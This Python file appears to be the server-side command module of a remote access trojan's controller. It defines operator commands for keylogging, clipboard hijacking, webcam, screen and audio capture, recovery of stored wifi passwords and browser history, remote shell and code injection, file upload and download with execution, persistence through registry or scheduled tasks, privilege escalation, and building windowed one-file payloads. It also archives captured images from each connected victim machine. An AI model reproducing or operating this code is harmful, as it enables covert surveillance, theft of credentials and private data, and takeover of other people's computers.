'''
    Represents the majority of the actual work utilizing
    the a large amount of server-sided classes. Setting up
    the available events & their functionality supporting
    most any kind of interactions, error handling & their
    respective responses to be neatly displayed.

    Verified: 2021 February 7
    * Follows PEP8
    * Tested Platforms
        * Windows 10
    * Third Party Modules
        * opencv-python
        * numpy
        * eel
'''

from server.state import ServerStatic, Dynamic
from server.environment import Environment
from server.controller import Controller
from server.blacklist import Blacklist
from server.helper import ServerHelper
from server.autotask import Autotask
from server.error import ServerError
from server.console import Console
from shared.helper import Helper
from shared.state import Static
from server.event import Event
from server.alias import Alias
from shared.data import Data

import webbrowser
import threading
import numpy
import cv2
import os

if not ServerStatic.TERMINAL:
    import eel

Event('sysinfo', 'session', 'surveillance', (('gpu', False, False),
                                             ('cpu', False, False),
                                             ('memory', False, False),
                                             ('disk', False, False),
                                             ('network', False, False),
                                             ('io', False, False)))()
Event('system', 'session', 'action', (('shutdown', False, False),
                                      ('restart', False, False),
                                      ('logout', False, False),
                                      ('hibernate', False, False),
                                      ('standby', False, False)))()
Event('download', 'session', 'surveillance', (('file', False, True),
                                              ('dir', False, True),
                                              ('execute', False, False)))()
Event('autostart', 'session', 'connection', (('shell', False, False),
                                             ('registry', False, False),
                                             ('schedule', False, False)))()
Event('recover', 'session', 'surveillance', (('wifi', False, False),
                                             ('history', False, False),
                                             ('bookmark', False, False)))()
Event('blacklist', 'universal', 'management', (('add', False, True),
                                               ('remove', False, True),
                                               ('update', False, True)))()
Event('upload', 'session', 'surveillance', (('file', False, True),
                                            ('url', False, True),
                                            ('execute', False, False)))()
Event('inject', 'session', 'execution', (('exec', False, True),
                                         ('script', False, True),
                                         ('unblock', False, False)))()
Event('alias', 'universal', 'management', (('add', False, True),
                                           ('remove', False, True),
                                           ('update', False, True)))()
Event('process', 'session', 'action', (('kill', False, True),
                                       ('tasklist', False, False),
                                       ('network', False, False)))()
Event('build', 'universal', 'utility', (('file', True, True),
                                        ('icon', False, True),
                                        ('window', False, False)))()
Event('alert', 'session', 'action', (('title', True, True),
                                     ('text', True, True),
                                     ('symbol', False, True)))()
Event('screenshot', 'session', 'surveillance', (('monitor', False, True),
                                                ('show', False, False)))()
Event('autotask', 'universal', 'management', (('add', False, True),
                                              ('remove', False, True)))()
Event('session', 'universal', 'connection', (('id', False, True),
                                             ('remove', False, False)))()
Event('snapshot', 'session', 'surveillance', (('device', False, True),
                                              ('show', False, False)))()
Event('python', 'session', 'execution', (('exec', False, True),
                                         ('script', False, True)))()
Event('clipboard', 'session', 'action', (('copy', False, True),
                                         ('empty', False, False)))()
Event('audio', 'session', 'live', (('channels', False, True),
                                   ('rate', False, True)))()
Event('environment', 'universal', 'management', (('set', False, True),))()
Event('delete', 'universal', 'connection', (('id', True, True),))()
Event('shell', 'session', 'execution', (('input', True, True),))()
Event('desktop', 'session', 'live', (('monitor', False, True),))()
Event('modules', 'universal', 'live', (('close', False, True),))()
Event('note', 'universal', 'utility', (('write', True, True),))()
Event('webcam', 'session', 'live', (('device', False, True),))()
Event('browse', 'session', 'action', (('url', True, True),))()
Event('who', 'universal', 'utility', (('id', True, True),))()
Event('disconnect', 'session', 'connection')()
Event('reconnect', 'session', 'connection')()
Event('uninstall', 'session', 'connection')()
Event('escalate', 'session', 'connection')()
Event('close', 'universal', 'multiplex')()
Event('clear', 'universal', 'terminal')()
Event('all', 'universal', 'multiplex')()
Event('help', 'universal', 'terminal')()
Event('list', 'universal', 'terminal')()
Event('exit', 'universal', 'terminal')()
Event('keylogger', 'session', 'live')()
Event('gui', 'universal', 'utility')()
Event('clipper', 'session', 'live')()


@ServerError.quiet
def destroy_token(token):
    del Dynamic.TOKENS[token]


@ServerError.quiet
def create_token(module_type, *args):
    token = ServerHelper.uuid()
    token_timeout = threading.Timer(ServerStatic.TOKEN_TIMEOUT,
                                    destroy_token, (token,))
    Dynamic.TOKENS[token] = (token_timeout, module_type, args)
    token_timeout.start()

    return token


def screenshot_handler(connect_ip, uuid, data, show):
    raw_bytes = Data.b64decode(data)
    assert raw_bytes, 'Void Screenshot'

    np_array = numpy.frombuffer(raw_bytes, numpy.uint8)
    np_array = cv2.imdecode(np_array, cv2.IMREAD_UNCHANGED)

    dirpath = os.path.join(ServerStatic.ARCHIVE_DIR,
                           connect_ip.safe, 'screenshots')

    if not os.path.isdir(dirpath):
        os.makedirs(dirpath, exist_ok=True)

    cv2.imwrite(os.path.join(
        dirpath, ServerHelper.filename('png')), np_array)

    if show:
        title = '{} {} {} [{}]'.format(connect_ip.pure,
                                       ServerStatic.SEPERATOR,
                                       uuid, ServerHelper.uuid())
        cv2.namedWindow(title, cv2.WINDOW_NORMAL)
        cv2.resizeWindow(title, *ServerStatic.WINDOW_SIZE)
        cv2.imshow(title, np_array)
        cv2.waitKey()


def snapshot_handler(connect_ip, uuid, data, show):
    raw_bytes = Data.b64decode(data)
    assert raw_bytes, 'Void Snapshot'

    np_array = numpy.frombuffer(raw_bytes, numpy.uint8)
    np_array = cv2.imdecode(np_array, cv2.IMREAD_UNCHANGED)
    np_array = cv2.cvtColor(np_array, cv2.COLOR_RGB2BGR)
    np_array = cv2.flip(np_array, 0)

    dirpath = os.path.join(ServerStatic.ARCHIVE_DIR,
                           connect_ip.safe, 'snapshots')

    if not os.path.isdir(dirpath):
        os.makedirs(dirpath, exist_ok=True)

    cv2.imwrite(os.path.join(
        dirpath, ServerHelper.filename('png')), np_array)

    if show:
        title = '{} {} {} [{}]'.format(connect_ip.pure,
                                       ServerStatic.SEPERATOR,
                                       uuid, ServerHelper.uuid())
        cv2.imshow(title, np_array)
        cv2.waitKey()


def download_handler(connect_ip, _, data, filename, execute):
    response = Data.b64decode(data)
    assert response, 'Void File'

    dirpath = os.path.join(ServerStatic.ARCHIVE_DIR,
                           connect_ip.safe, 'downloads')
    filepath = os.path.join(dirpath, filename)

    if not os.path.isdir(dirpath):
        os.makedirs(dirpath, exist_ok=True)

    Helper.write_file(filepath, response, Helper.WRITE_BYTES)

    if execute:
        Helper.start(filepath)


def recover_handler(connect_ip, _, data, filename):
    dirpath = os.path.join(ServerStatic.ARCHIVE_DIR,
                           connect_ip.safe, 'recovery')

    if not os.path.isdir(dirpath):
        os.makedirs(dirpath, exist_ok=True)

    Helper.write_file(os.path.join(
        dirpath, filename), data, Helper.WRITE)


@ServerError.general
def shell(request, gui_call, custom):
    request, store = Helper.store(request, ('input',))
    assert store.input, 'Server Argument Error'

    del request['input']
    request['message'] = Static.RAW + store.input

    return Controller.message(gui_call, request,
                              ret=gui_call, custom=custom)


@ServerError.general
def alias(request, gui_call):
    request, store = Helper.store(request, ('add', 'remove', 'update'))
    alias = Alias(gui_call)

    if store.add:
        return alias.add(*ServerHelper.split(store.add))
    elif store.remove:
        return alias.remove(store.remove.strip())
    elif store.update:
        key, value = ServerHelper.split(store.update)
        return alias.update(key, *ServerHelper.split(value, ','))
    else:
        return alias.list()


@ServerError.general
def environment(request, gui_call):
    request, store = Helper.store(request, ('set',))

    if store.set:
        environment = Environment(gui_call)
        return environment.set(*ServerHelper.split(store.set))
    else:
        return Environment.list(gui_call)


@ServerError.general
def build(request, gui_call):
    request, store = Helper.store(request, ('file', 'icon', 'window'))
    assert store.file, 'Server Argument Error'

    args = ['pyinstaller',
            f'--distpath={Static.ROOT_DIR}',
            f'--workpath={ServerStatic.BUILD_DIR}',
            f'--specpath={ServerStatic.BUILD_DIR}',
            '--log-level=CRITICAL',
            '--onefile',
            os.path.join(Static.ROOT_DIR, store.file)]

    if store.icon:
        args.append('--icon={}'.format(
            os.path.join(Static.ROOT_DIR, store.icon)))

    if not store.window:
        args.append('--windowed')

    if Helper.run(args):
        return Console.printf('Compilation complete',
                              Static.SUCCESS, ret=gui_call)
    else:
        return Console.printf('Compilation failed',
                              Static.DANGER, ret=gui_call)


@ServerError.general
def autotask(request, gui_call):
    request, store = Helper.store(request, ('add', 'remove'))
    autotask = Autotask(gui_call)

    if store.add:
        return autotask.add(store.add)
    elif store.remove:
        return autotask.remove(store.remove)
    else:
        return autotask.list()


@ServerError.general
def blacklist(request, gui_call):
    request, store = Helper.store(request, ('add', 'remove', 'update'))
    blacklist = Blacklist(gui_call)

    if store.add:
        ips = ServerHelper.split(store.add, ',')

        if len(ips) == 1:
            return blacklist.add(*ips)
        else:
            for ip in ips:
                try:
                    blacklist.add(ip)
                except Exception:
                    pass

            return Console.printf('Blacklist address{} added'.format(
               Helper.plural(ips, 'es')), Static.SUCCESS, ret=gui_call)
    elif store.remove:
        ips = ServerHelper.split(store.remove, ',')

        if len(ips) == 1:
            return blacklist.remove(*ips)
        else:
            for ip in ips:
                try:
                    blacklist.remove(ip)
                except Exception:
                    pass

            return Console.printf('Blacklist address{} removed'.format(
               Helper.plural(ips, 'es')), Static.SUCCESS, ret=gui_call)
    elif store.update:
        return blacklist.update(*ServerHelper.split(store.update))
    else:
        return blacklist.list()


@ServerError.general
def all(_, gui_call):
    if not Dynamic.CLIENTS:
        if gui_call:
            return Console.alert('No Clients Connected', Static.WARNING)
        else:
            Console.printf('No clients connected', Static.WARNING)
    elif Dynamic.CLIENTS.keys() != Dynamic.SESSION:
        Dynamic.SESSION = set(Dynamic.CLIENTS.keys())

        if not ServerStatic.TERMINAL:
            if eel._websockets != []:
                eel.sessionAllEel()

        if gui_call:
            return Console.alert('All Status Achieved', Static.SUCCESS)
        else:
            Console.printf('All status achieved', Static.SUCCESS)
    else:
        if gui_call:
            return Console.alert('Already All Status', Static.WARNING)
        else:
            Console.printf('Already all status', Static.WARNING)


@ServerError.general
def clear(_, gui_call):
    if gui_call:
        return Console.alert('Request Not Available', Static.WARNING)
    else:
        if Static.WINDOWS:
            os.system('cls')
        else:
            os.system('clear')

        Console.printf(raw=True)


@ServerError.general
def clipboard(request, gui_call, custom):
    return Controller.message(gui_call, request,
                              ret=gui_call, custom=custom)


@ServerError.general
def close(_, gui_call):
    if Dynamic.SESSION:
        Dynamic.SESSION.clear()

        if not ServerStatic.TERMINAL:
            if eel._websockets != []:
                eel.sessionCloseEel()

        if gui_call:
            return Console.alert('Session Closed', Static.INFO)
        else:
            Console.printf('Session closed', Static.INFO)
    else:
        if gui_call:
            return Console.alert('No Active Session', Static.WARNING)
        else:
            Console.printf('No active session', Static.WARNING)


@ServerError.general
def delete(request, gui_call):
    request, store = Helper.store(request, ('id',))
    assert store.id, 'Server Argument Error'

    uuids = ServerHelper.split(store.id, ',')
    allow_raise = len(uuids) == 1

    for uuid in uuids:
        Controller.delete_client(uuid, allow_raise)

    return Console.printf('Client{} removed'.format(
        Helper.plural(uuids)), Static.INFO, ret=gui_call)


def exit(_, gui_call):
    if gui_call:
        return Console.alert('Exit Not Available To GUI/Web', Static.WARNING)
    else:
        Console.printf(f'Exiting {ServerStatic.NAME}', Static.INFO, False)
        Controller.exit_program()


@ServerError.general
def gui(_, gui_call):
    if ServerStatic.TERMINAL:
        Console.printf('GUI not available to terminal', Static.WARNING)
    elif ServerStatic.WEB_GUI:
        webbrowser.open('{}/{}'.format(ServerStatic.GUI_HOST,
                                       ServerStatic.GUI_PAGE), 1)

        if gui_call:
            return Console.alert('Browser Window Opened', Static.INFO)
        else:
            Console.printf('Browser window opened', Static.INFO)
    else:
        eel.browsers.open((ServerStatic.GUI_PAGE,), eel._start_args)

        if gui_call:
            return Console.alert('GUI Window Opened', Static.INFO)
        else:
            Console.printf('GUI window opened', Static.INFO)


@ServerError.general
def who(request, gui_call):
    request, store = Helper.store(request, ('id',))
    assert store.id, 'Server Argument Error'

    client = Dynamic.CLIENTS.get(store.id, False)

    if client:
        headers, values = ('Data Point', 'Value'), []

        for key, value in ServerStatic.CATEGORIES:
            values.append((key, client.data[value]))

        return Console.tabulate(values, headers, gui_call)
    else:
        return Console.printf('Client not found',
                              Static.WARNING, ret=gui_call)


def help(_, gui_call):
    return Console.tabulate(ServerStatic.HELP, (
        'Available',
        'Namespace',
        'Command',
        'Arguments'
    ), gui_call)


def list(_, gui_call):
    if Dynamic.CLIENTS:
        headers, values = ('Row', 'Country', 'Connect IP', 'Unique ID',
                           'Build Version', 'Username', 'Operating System',
                           'Privileges'), []

        for row, (unique_id, client) in enumerate(
                Dynamic.CLIENTS.items(), 1):
            values.append((
                row,
                client.country,
                client.connect_ip.pure,
                unique_id,
                client.build_version,
                client.username,
                client.operating_system,
                client.privileges
            ))

        return Console.tabulate(values, headers, gui_call)
    else:
        return Console.printf('No clients connected',
                              Static.INFO, ret=gui_call)


@ServerError.general
def note(request, gui_call):
    request, store = Helper.store(request, ('write',))
    assert store.write, 'Server Argument Error'

    if not os.path.isdir(ServerStatic.ARCHIVE_DIR):
        os.makedirs(ServerStatic.ARCHIVE_DIR, exist_ok=True)

    Helper.write_file(os.path.join(
        ServerStatic.ARCHIVE_DIR, 'notes.txt'
    ), '{}\n{}\n\n'.format(Helper.timestamp(),
                           store.write.replace(r'\n', '\n')))

    return Console.printf('Note written down',
                          Static.INFO, ret=gui_call)


@ServerError.general
def session(request, gui_call):
    request, store = Helper.store(request, ('id', 'remove'))

    if store.id:
        uuids = ServerHelper.split(store.id, ',')
        allow_raise = len(uuids) == 1

        if store.remove:
            for uuid in uuids:
                Controller.remove_session(uuid, allow_raise)

            return Console.printf('Client{} removed from session'.format(
                Helper.plural(uuids)), Static.SUCCESS, ret=gui_call)
        else:
            for uuid in uuids:
                Controller.add_session(uuid, allow_raise)

            return Console.printf('Client{} added to session'.format(
                Helper.plural(uuids)), Static.SUCCESS, ret=gui_call)
    else:
        if Dynamic.SESSION:
            headers, values = ('Row', 'Country', 'Connect IP', 'Unique ID',
                               'Build Version', 'Username', 'Operating System',
                               'Privileges'), []

            for row, (unique_id, client) in enumerate(
                    ((unique_id, Dynamic.CLIENTS[unique_id])
                     for unique_id in Dynamic.SESSION), 1):
                values.append((
                    row,
                    client.country,
                    client.connect_ip.pure,
                    unique_id,
                    client.build_version,
                    client.username,
                    client.operating_system,
                    client.privileges
                ))

            return Console.tabulate(values, headers, gui_call)
        else:
            return Console.printf('No active session',
                                  Static.INFO, ret=gui_call)


@ServerError.general
def uninstall(_, gui_call, custom):
    return Controller.message(
        gui_call, Data.message(Static.UNINSTALL),
        ret=gui_call, custom=custom)


@ServerError.general
def disconnect(_, gui_call, custom):
    return Controller.message(
        gui_call, Data.message(Static.DISCONNECT),
        ret=gui_call, custom=custom)


@ServerError.general
def reconnect(_, gui_call, custom):
    return Controller.message(
        gui_call, Data.message(Static.RECONNECT),
        ret=gui_call, custom=custom)


@ServerError.general
def python(request, gui_call, custom):
    request, store = Helper.store(request, ('exec', 'script'))
    assert store.exec or store.script, 'Server Argument Error'

    if store.script:
        dirpath = os.path.join(ServerStatic.ARCHIVE_DIR, 'scripts')

        if not os.path.isdir(dirpath):
            os.makedirs(dirpath, exist_ok=True)

        data = Helper.read_file(os.path.join(
                                dirpath, store.script)).strip()

        assert data, 'Empty Python Script'

        del request['script']
        request['exec'] = data

    return Controller.message(gui_call, request,
                              ret=gui_call, custom=custom)


@ServerError.general
def inject(request, gui_call, custom):
    request, store = Helper.store(request, ('exec', 'script'))
    assert store.exec or store.script, 'Server Argument Error'

    if store.script:
        dirpath = os.path.join(ServerStatic.ARCHIVE_DIR, 'scripts')

        if not os.path.isdir(dirpath):
            os.makedirs(dirpath, exist_ok=True)

        data = Helper.read_file(os.path.join(
                                dirpath, store.script)).strip()

        assert data, 'Empty Injection Script'

        del request['script']
        request['exec'] = ServerHelper.split(data, '\n', True)
    else:
        request['exec'] = ServerHelper.split(store.exec, ';', True)

    return Controller.message(gui_call, request,
                              ret=gui_call, custom=custom)


@ServerError.general
def browse(request, gui_call, custom):
    request, store = Helper.store(request, ('url',))
    assert store.url, 'Server Argument Error'

    request['url'] = ServerHelper.split(store.url, ',', True)

    return Controller.message(gui_call, request,
                              ret=gui_call, custom=custom)


@ServerError.general
def screenshot(request, gui_call, custom):
    request, store = Helper.store(request, ('monitor', 'show'))

    if store.show:
        assert not ServerStatic.WEB_GUI, 'Feature Not Available To Web'

    if store.monitor:
        request['monitor'] = int(store.monitor)
    else:
        request['monitor'] = 1

    return Controller.message(gui_call, request, loading='Downloading...',
                              ret=gui_call, callback=screenshot_handler,
                              args=(store.show,), custom=custom)


@ServerError.general
def snapshot(request, gui_call, custom):
    request, store = Helper.store(request, ('device', 'show'))

    if store.show:
        assert not ServerStatic.WEB_GUI, 'Feature Not Available To Web'

    if store.device:
        request['device'] = int(store.device)
        assert request['device'] > 0, 'Server Argument Error'
    else:
        request['device'] = 1

    return Controller.message(gui_call, request, loading='Downloading...',
                              ret=gui_call, callback=snapshot_handler,
                              args=(store.show,), custom=custom)


@ServerError.general
def alert(request, gui_call, custom):
    request, store = Helper.store(request, ('title', 'text', 'symbol'))
    assert store.title and store.text, 'Server Argument Error'

    if type(store.symbol) is str:
        store.symbol = store.symbol.upper()

    if store.symbol == Static.DANGER:
        request['symbol'] = 16
    elif store.symbol == Static.WARNING:
        request['symbol'] = 48
    elif store.symbol == Static.INFO:
        request['symbol'] = 64
    else:
        request['symbol'] = 32

    return Controller.message(gui_call, request,
                              ret=gui_call, custom=custom)


@ServerError.general
def system(request, gui_call, custom):
    request, store = Helper.store(request, ('shutdown', 'restart',
                                            'logout', 'hibernate',
                                            'standby'))
    assert any((store.shutdown, store.restart,
                store.logout, store.hibernate,
                store.standby)), 'Server Argument Error'

    return Controller.message(gui_call, request,
                              ret=gui_call, custom=custom)


@ServerError.general
def download(request, gui_call, custom):
    request, store = Helper.store(request, ('file', 'dir', 'execute'))
    assert store.file or store.dir, 'Server Argument Error'

    if gui_call:
        assert not store.execute, 'Execute not allowed from GUI'

    if store.file:
        filename = os.path.split(store.file)[1]
    else:
        filename = f'{os.path.split(store.dir)[1]}.zip'

    return Controller.message(gui_call, request, ret=gui_call,
                              callback=download_handler,
                              args=(filename, store.execute),
                              custom=custom)


@ServerError.general
def upload(request, gui_call, custom):
    request, store = Helper.store(request, ('file', 'url'))
    assert store.file or store.url, 'Server Argument Error'

    if store.file:
        dirpath = os.path.join(ServerStatic.ARCHIVE_DIR, 'uploads')
        filepath = os.path.join(dirpath, store.file)

        if not os.path.isdir(dirpath):
            os.makedirs(dirpath, exist_ok=True)

        assert os.path.isfile(filepath), 'File Not Found'
        request['custom'] = Data.b64encode(
            Helper.read_file(filepath, Helper.READ_BYTES))

    return Controller.message(gui_call, request,
                              ret=gui_call, custom=custom)


@ServerError.general
def escalate(request, gui_call, custom):
    return Controller.message(gui_call, request,
                              ret=gui_call, custom=custom)


@ServerError.general
def autostart(request, gui_call, custom):
    request, store = Helper.store(request, ('shell', 'registry', 'schedule'))
    assert any((store.shell, store.registry,
                store.schedule)), 'Server Argument Error'

    return Controller.message(gui_call, request,
                              ret=gui_call, custom=custom)


@ServerError.general
def recover(request, gui_call, custom):
    request, store = Helper.store(request, ('wifi', 'history', 'bookmark'))
    assert any((store.wifi, store.history,
                store.bookmark)), 'Server Argument Error'

    if store.history:
        return Controller.message(gui_call, request,
                                  ret=gui_call,
                                  callback=recover_handler,
                                  args=('history.csv',),
                                  custom=custom)
    elif store.bookmark:
        return Controller.message(gui_call, request,
                                  ret=gui_call,
                                  callback=recover_handler,
                                  args=('bookmarks.csv',),
                                  custom=custom)
    else:
        return Controller.message(gui_call, request,
                                  ret=gui_call, custom=custom)


@ServerError.general
def process(request, gui_call, custom):
    request, store = Helper.store(request, ('kill', 'tasklist', 'network'))
    assert any((store.kill, store.tasklist,
                store.network)), 'Server Argument Error'

    return Controller.message(gui_call, request,
                              ret=gui_call, custom=custom)


@ServerError.general
def sysinfo(request, gui_call, custom):
    request, store = Helper.store(request, ('gpu', 'cpu', 'memory',
                                            'disk', 'network', 'io'))
    assert any((store.gpu, store.cpu, store.memory, store.disk,
                store.network, store.io)), 'Server Argument Error'

    return Controller.message(gui_call, request,
                              ret=gui_call, custom=custom)


@ServerError.general
def desktop(request, gui_call, custom):
    assert not ServerStatic.WEB_GUI, 'Feature Not Available To Web'
    request, store = Helper.store(request, ('monitor',))

    if store.monitor:
        request['monitor'] = int(store.monitor)
    else:
        request['monitor'] = 1

    request['token'] = create_token(ServerStatic.DESKTOP)

    return Controller.message(gui_call, request,
                              ret=gui_call, custom=custom)


@ServerError.general
def webcam(request, gui_call, custom):
    assert not ServerStatic.WEB_GUI, 'Feature Not Available To Web'
    request, store = Helper.store(request, ('device',))

    if store.device:
        request['device'] = int(store.device)
        assert request['device'] > 0, 'Server Argument Error'
    else:
        request['device'] = 1

    request['token'] = create_token(ServerStatic.WEBCAM)

    return Controller.message(gui_call, request,
                              ret=gui_call, custom=custom)


@ServerError.general
def audio(request, gui_call, custom):
    assert not ServerStatic.WEB_GUI, 'Feature Not Available To Web'
    request, store = Helper.store(request, ('channels', 'rate'))

    if store.channels:
        request['channels'] = int(store.channels)
    else:
        request['channels'] = 2

    if store.rate:
        request['rate'] = int(store.rate)
    else:
        request['rate'] = 44100

    request['token'] = create_token(ServerStatic.AUDIO,
                                    request['channels'],
                                    request['rate'])

    return Controller.message(gui_call, request,
                              ret=gui_call, custom=custom)


@ServerError.general
def keylogger(request, gui_call, custom):
    request['token'] = create_token(ServerStatic.KEYLOGGER)

    return Controller.message(gui_call, request,
                              ret=gui_call, custom=custom)


@ServerError.general
def clipper(request, gui_call, custom):
    request['token'] = create_token(ServerStatic.CLIPPER)

    return Controller.message(gui_call, request,
                              ret=gui_call, custom=custom)


@ServerError.general
def modules(request, gui_call):
    request, store = Helper.store(request, ('close',))

    if store.close:
        Dynamic.MODULES[store.close].close()

        return Console.printf('Module closed',
                              Static.SUCCESS, ret=gui_call)
    else:
        if Dynamic.MODULES:
            headers, values = ('Module Token',
                               'Module Type', 'Connect IP'), []

            for module_id, module in Dynamic.MODULES.items():
                values.append((module_id,
                               str(module), module.connect_ip))

            return Console.tabulate(values, headers, gui_call)
        else:
            return Console.printf('No active modules',
                                  Static.INFO, ret=gui_call)
